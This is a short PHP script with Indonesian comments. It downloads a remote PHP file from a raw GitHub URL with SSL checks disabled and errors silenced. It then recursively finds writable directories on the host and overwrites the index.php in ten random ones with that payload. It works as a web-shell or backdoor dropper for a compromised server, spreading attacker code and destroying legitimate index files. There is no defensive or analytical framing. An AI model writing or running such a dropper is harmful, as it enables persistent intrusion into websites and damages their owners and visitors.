<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

// Link RAW file GitHub yang akan disalin
$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/main/oke.php';

// Fungsi ambil konten dari URL
function fetch_from_url($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        return @file_get_contents($url);
    }
}

// Fungsi scan folder writable
function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    $result = [];
    if ($currentDepth > $maxDepth) return $result;
    $items = @scandir($baseDir);
    if (!$items) return $result;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $result[] = $fullPath;
            }
            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
        }
    }
    return $result;
}

// Ambil isi file dari GitHub
$content = fetch_from_url($remoteFile);

if (!$content || strlen($content) < 10) {
    exit("Gagal mengunduh konten dari GitHub.\n");
}

// Cari folder writable
$allWritable = scanWritableDirs(__DIR__, 10);

if (empty($allWritable)) {
    exit("Tidak ada folder writable ditemukan.\n");
}

// Pilih 10 folder acak
shuffle($allWritable);
$targetFolders = array_slice($allWritable, 0, 10);

$successCount = 0;
$uploadedPaths = [];

foreach ($targetFolders as $folder) {
    $target = $folder . DIRECTORY_SEPARATOR . 'index.php';
    if (@file_put_contents($target, $content)) {
        $successCount++;
        $uploadedPaths[] = $target;
    }
}

// Output hasil
if ($successCount > 0) {
    echo "Berhasil menyimpan ke $successCount folder:\n";
    foreach ($uploadedPaths as $path) {
        echo "- $path\n";
    }
} else {
    echo "Gagal menyalin ke folder manapun.\n";
}
?>
